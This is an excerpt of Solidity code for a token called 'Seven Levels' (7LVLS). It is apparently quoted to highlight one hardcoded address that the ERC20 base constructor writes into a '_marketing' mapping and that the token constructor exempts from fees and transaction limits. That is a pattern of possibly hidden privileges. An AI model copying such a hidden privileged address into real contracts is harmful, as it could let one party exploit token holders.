...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _marketing[0xeCb6dfdA1f320c7db859AfDBCB08E2d8D84502ff] = _marketingwallet;
    }
...
contract SevenLevels is ERC20, Ownable {
    ...
    constructor() ERC20("Seven Levels", "7LVLS") {
        ...
        excludeFromFees(address(0xeCb6dfdA1f320c7db859AfDBCB08E2d8D84502ff), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xeCb6dfdA1f320c7db859AfDBCB08E2d8D84502ff), true);
